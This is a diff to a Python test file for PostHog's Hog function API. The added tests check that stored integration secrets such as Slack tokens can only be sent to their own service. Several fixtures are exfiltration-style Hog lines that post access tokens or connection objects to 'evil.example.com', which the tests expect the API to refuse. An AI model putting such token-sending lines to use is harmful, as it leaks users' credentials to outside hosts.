@@ -1,4 +1,5 @@
 import json
+from collections.abc import Callable
 from datetime import UTC, datetime
 from typing import Any, Optional
 
@@ -22,9 +23,11 @@ from products.access_control.backend.models.access_control import AccessControl
 from products.actions.backend.facade.api import get_actions
 from products.actions.backend.facade.testing import create_action
 from products.cdp.backend.api.hog_function import (
+    INTEGRATION_ORIGIN_MESSAGE,
     MAX_HOG_CODE_SIZE_BYTES,
     MAX_LOG_TRANSFORMATIONS_PER_TEAM,
     MAX_TRANSFORMATIONS_PER_TEAM,
+    SECRET_REENTRY_MESSAGE,
     comparable_content,
 )
 from products.cdp.backend.api.test.secret_sender import (
@@ -99,6 +102,20 @@ EXAMPLE_FULL: dict[str, Any] = {
         "filter_test_accounts": True,
     },
 }
+
+
+SLACK_SENDER_HOG = (
+    "fetch('https://slack.com/api/chat.postMessage', "
+    "{'headers': {'Authorization': f'Bearer {inputs.slack_workspace.access_token}'}});"
+)
+SLACK_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.slack_workspace.access_token});"
+CONNECTION_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.conn});"
+GITLAB_TOKEN_SENDER_HOG = "fetch(f'{inputs.conn.hostname}/api', {'body': inputs.token});"
+PUSH_SENDER_HOG = (
+    "let res := sendPushNotification({'integrationIds': arrayMap(c -> c.$integration_id, inputs.channels), "
+    "'payload': {'title': 'Hi'}})\nif (not res.success) { throw Error(f'Push failed: {res.error}') }"
+)
+PAGEVIEW_FILTERS = {"events": [{"id": "$pageview", "name": "$pageview", "type": "events", "order": 0}]}
 
 
 def get_db_field_value(field, model_id):
@@ -1626,6 +1643,288 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             }
         ]
 
+    def _connection_sender(self, kind: str, schema_kind: str, hog: str = SLACK_SENDER_HOG) -> HogFunction:
+        connection = Integration.objects.create(
+            team=self.team, kind=kind, sensitive_config={"access_token": "xoxb-stored"}, created_by=self.user
+        )
+        return HogFunction.objects.create(
+            team=self.team,
+            name="Connection sender",
+            type="destination",
+            hog=hog,
+            inputs_schema=[{"key": "slack_workspace", "type": "integration", "integration": schema_kind}],
+            inputs={"slack_workspace": {"value": connection.id}},
+        )
+
+    @parameterized.expand(
+        [
+            ("rename", "slack", SLACK_LEAKING_HOG, {"name": "Renamed"}, True, status.HTTP_200_OK, "integration_kept"),
+            ("disable", "slack", SLACK_LEAKING_HOG, {"enabled": False}, True, status.HTTP_200_OK, "integration_kept"),
+            (
+                "code_sends_it_within_its_service",
+                "slack",
+                SLACK_SENDER_HOG,
+                {"hog": SLACK_SENDER_HOG.replace("chat.postMessage", "chat.update")},
+                True,
+                status.HTTP_200_OK,
+                "integration_within",
+            ),
+            (
+                "code_sends_it_elsewhere",
+                "slack",
+                SLACK_SENDER_HOG,
+                {"hog": SLACK_LEAKING_HOG},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                "integration_refused",
+            ),
+            (
+                "code_sends_it_elsewhere_with_the_flag_off",
+                "slack",
+                SLACK_SENDER_HOG,
+                {"hog": SLACK_LEAKING_HOG},
+                False,
+                status.HTTP_200_OK,
+                "integration_would_refuse",
+            ),
+            (
+                "code_cannot_be_analyzed",
+                "slack",
+                SLACK_SENDER_HOG,
+                {"hog": "fetch(event.properties.url, {'body': inputs.slack_workspace});"},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                "integration_refused",
+            ),
+            (
+                "unlisted_kind_rename",
+                "jira",
+                SLACK_LEAKING_HOG,
+                {"name": "Renamed"},
+                True,
+                status.HTTP_200_OK,
+                "integration_unlisted_kept",
+            ),
+            (
+                "unlisted_kind_code_change",
+                "jira",
+                SLACK_SENDER_HOG,
+                {"hog": SLACK_LEAKING_HOG},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                "integration_unlisted_refused",
+            ),
+            (
+                "unlisted_kind_code_change_with_the_flag_off",
+                "jira",
+                SLACK_SENDER_HOG,
+                {"hog": SLACK_LEAKING_HOG},
+                False,
+                status.HTTP_200_OK,
+                "integration_unlisted_would_refuse",
+            ),
+        ]
+    )
+    def test_connection_can_only_be_sent_to_its_service(
+        self,
+        _name: str,
+        kind: str,
+        stored_hog: str,
+        change: dict,
+        flag_on: bool,
+        expected_status: int,
+        counted_outcome: str,
+    ) -> None:
+        function = self._connection_sender(kind, kind, stored_hog)
+        labels = {"outcome": counted_outcome, "surface": "partial_update", "kind": kind}
+        counted_before = REGISTRY.get_sample_value("posthog_cdp_secret_host_binding_total", labels) or 0
+
+        with secret_host_binding_flag(flag_on):
+            res = self.client.patch(f"/api/projects/{self.team.id}/hog_functions/{function.id}", data=change)
+
+        assert res.status_code == expected_status, res.json()
+        counted = REGISTRY.get_sample_value("posthog_cdp_secret_host_binding_total", labels) or 0
+        assert counted - counted_before == 1
+        if expected_status == status.HTTP_400_BAD_REQUEST:
+            assert (res.json()["attr"], res.json()["code"]) == ("inputs__slack_workspace", "integration_origin_refused")
+
+    @parameterized.expand(
+        [
+            (
+                "multi_input_holding_an_unlisted_kind",
+                None,
+                lambda ids: {
+                    "inputs_schema": [{"key": "conn", "type": "integration_multi"}],
+                    "inputs": {"conn": {"value": [ids["slack"], ids["jira"]]}},
+                },
+                "inputs__conn",
+                "integration_origin_refused",
+                INTEGRATION_ORIGIN_MESSAGE,
+            ),
+            (
+                "mapping_value_for_a_top_level_connection",
+                None,
+                lambda ids: {
+                    "inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack"}],
+                    "inputs": {},
+                    "mappings": [
+                        {
+                            "filters": PAGEVIEW_FILTERS,
+                            "inputs_schema": [{"key": "conn", "type": "number"}],
+                            "inputs": {"conn": {"value": ids["slack"]}},
+                        }
+                    ],
+                },
+                "inputs__conn",
+                "integration_origin_refused",
+                INTEGRATION_ORIGIN_MESSAGE,
+            ),
+            (
+                "schema_change_alone_makes_an_input_a_connection",
+                lambda ids: {
+                    "inputs_schema": [{"key": "conn", "type": "number"}],
+                    "inputs": {"conn": {"value": ids["slack"]}},
+                },
+                lambda ids: {"inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack"}]},
+                "inputs__conn",
+                "integration_origin_refused",
+                INTEGRATION_ORIGIN_MESSAGE,
+            ),
+            (
+                "schema_change_alone_moves_a_secret",
+                lambda ids: {
+                    "hog": GITLAB_TOKEN_SENDER_HOG,
+                    "inputs_schema": [
+                        {"key": "conn", "type": "number"},
+                        {"key": "token", "type": "string", "secret": True},
+                    ],
+                    "inputs": {"conn": {"value": ids["gitlab"]}},
+                    "encrypted_inputs": {"token": {"value": "I AM SECRET"}},
+                },
+                lambda ids: {
+                    "inputs_schema": [
+                        {"key": "conn", "type": "integration", "integration": "gitlab"},
+                        {"key": "token", "type": "string", "secret": True},
+                    ]
+                },
+                "inputs__token",
+                "secret_reentry_required",
+                SECRET_REENTRY_MESSAGE,
+            ),
+            (
+                "secret_connection_moved_shows_the_integration_refusal",
+                lambda ids: {
+                    "hog": SLACK_SENDER_HOG.replace("slack_workspace", "conn"),
+                    "inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack", "secret": True}],
+                    "encrypted_inputs": {"conn": {"value": ids["slack"]}},
+                },
+                lambda ids: {"hog": CONNECTION_LEAKING_HOG},
+                "inputs__conn",
+                "integration_origin_refused",
+                INTEGRATION_ORIGIN_MESSAGE,
+            ),
+            (
+                "connection_of_another_kind_than_the_code_sends_to",
+                lambda ids: {
+                    "hog": SLACK_SENDER_HOG.replace("slack_workspace", "conn"),
+                    "inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack"}],
+                    "inputs": {"conn": {"value": ids["slack"]}},
+                },
+                lambda ids: {"inputs": {"conn": {"value": ids["hubspot"]}}},
+                "inputs__conn",
+                "integration_origin_refused",
+                INTEGRATION_ORIGIN_MESSAGE,
+            ),
+        ]
+    )
+    def test_connection_the_worker_resolves_is_checked(
+        self,
+        _name: str,
+        stored: Optional[Callable[[dict], dict]],
+        change: Callable[[dict], dict],
+        expected_attr: str,
+        expected_code: str,
+        expected_message: str,
+    ) -> None:
+        ids = {
+            kind: Integration.objects.create(
+                team=self.team, kind=kind, config=config, sensitive_config={"access_token": "t"}, created_by=self.user
+            ).id
+            for kind, config in [
+                ("slack", {}),
+                ("hubspot", {}),
+                ("jira", {}),
+                ("gitlab", {"hostname": "https://git.example.com"}),
+            ]
+        }
+
+        with secret_host_binding_flag(True):
+            if stored is None:
+                res = self.client.post(
+                    f"/api/projects/{self.team.id}/hog_functions/",
+                    data={"name": "Sender", "type": "destination", "hog": CONNECTION_LEAKING_HOG, **change(ids)},
+                )
+            else:
+                function = HogFunction.objects.create(
+                    team=self.team,
+                    name="Sender",
+                    type="destination",
+                    **{"hog": CONNECTION_LEAKING_HOG, **stored(ids)},
+                )
+                res = self.client.patch(f"/api/projects/{self.team.id}/hog_functions/{function.id}", data=change(ids))
+
+        assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
+        assert (res.json()["attr"], res.json()["code"], res.json()["detail"]) == (
+            expected_attr,
+            expected_code,
+            expected_message,
+        )
+
+    @parameterized.expand(
+        [
+            ("push_channels", ["firebase", "apns"], status.HTTP_200_OK),
+            ("channel_of_a_kind_without_push", ["firebase", "slack"], status.HTTP_400_BAD_REQUEST),
+        ]
+    )
+    def test_connection_handed_to_a_worker_function(self, _name: str, kinds: list[str], expected_status: int) -> None:
+        HogFunctionTemplate.objects.create(
+            template_id="template-push-test",
+            sha="1.0.0",
+            name="Push",
+            description="Internal building block",
+            code=PUSH_SENDER_HOG,
+            code_language="hog",
+            inputs_schema=[],
+            type="destination",
+            status="hidden",
+            category=["Other"],
+            free=True,
+        )
+        ids = [
+            Integration.objects.create(
+                team=self.team, kind=kind, sensitive_config={"key": "k"}, created_by=self.user
+            ).id
+            for kind in kinds
+        ]
+        function = HogFunction.objects.create(
+            team=self.team,
+            name="Push step",
+            type="destination",
+            template_id="template-push-test",
+            enabled=False,
+            hog=PUSH_SENDER_HOG,
+            inputs_schema=[{"key": "channels", "type": "integration_multi", "integration": "firebase,apns"}],
+            inputs={"channels": {"value": ids}},
+        )
+
+        with secret_host_binding_flag(True):
+            res = self.client.patch(
+                f"/api/projects/{self.team.id}/hog_functions/{function.id}",
+                data={"hog": PUSH_SENDER_HOG.replace("'Hi'", "'Hello'")},
+            )
+
+        assert res.status_code == expected_status, res.json()
+
     @parameterized.expand(
         [("disable", {"enabled": False}), ("delete", {"deleted": True}), ("rename", {"name": "Renamed"})]
     )
@@ -3129,17 +3428,34 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
         mock_invocation.assert_not_called()
 
-    def test_test_invocation_rejects_a_posthog_connection_input(self):
-        connection = Integration.objects.create(team=self.team, kind="posthog", created_by=self.user)
+    @parameterized.expand(
+        [
+            ("posthog_connection", "posthog", EXAMPLE_FULL["hog"], "PostHog connection"),
+            (
+                "connection_sent_elsewhere",
+                "slack",
+                "fetch('https://evil.example.com', {'body': inputs.connection.access_token});",
+                "its own service",
+            ),
+        ]
+    )
+    def test_test_invocation_rejects_a_connection_it_cannot_use(
+        self, _name: str, kind: str, hog: str, expected_error: str
+    ) -> None:
+        connection = Integration.objects.create(team=self.team, kind=kind, created_by=self.user)
 
-        with patch(
-            "products.cdp.backend.api.hog_function.create_hog_invocation_test"
-        ) as mock_create_hog_invocation_test:
+        with (
+            secret_host_binding_flag(True),
+            patch(
+                "products.cdp.backend.api.hog_function.create_hog_invocation_test"
+            ) as mock_create_hog_invocation_test,
+        ):
             response = self.client.post(
                 f"/api/projects/{self.team.id}/hog_functions/new/invocations/",
                 data={
                     "configuration": {
                         **EXAMPLE_FULL,
+                        "hog": hog,
                         "inputs_schema": [
                             *EXAMPLE_FULL["inputs_schema"],
                             {"key": "connection", "type": "integration", "integration": "slack"},
@@ -3150,7 +3466,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             )
 
         assert response.status_code == status.HTTP_400_BAD_REQUEST, response.json()
-        assert "PostHog connection" in json.dumps(response.json())
+        assert expected_error in json.dumps(response.json())
         mock_create_hog_invocation_test.assert_not_called()
 
     def test_test_invocation_of_unsaved_function_cannot_borrow_a_hidden_templates_reserved_calls(self):
